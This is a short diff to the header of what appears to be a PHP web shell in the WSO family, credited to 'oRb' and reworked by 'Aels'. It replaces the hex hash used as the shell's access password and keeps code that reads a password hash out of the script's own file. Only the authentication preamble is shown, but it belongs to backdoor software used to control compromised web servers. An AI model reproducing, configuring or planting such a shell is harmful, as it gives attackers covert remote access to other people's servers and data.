@@ -4,7 +4,7 @@
 // by oRb, rework by Aels
 
 preg_match('/.*pass *= ?"?([a-f0-9]{32}).*/si', @file_get_contents($_SERVER['SCRIPT_FILENAME']), $matches);
-$auth_pass = "e7c8c9f0a7e3f8d9b2c1a4e5f6d7c8b9"; 
+$auth_pass = "63a9f0ea7bb98050796b649e85481845"; 
 $auth_pass = isset($matches[1]) ? $matches[1] : $auth_pass;
 
 $color = "#df5";
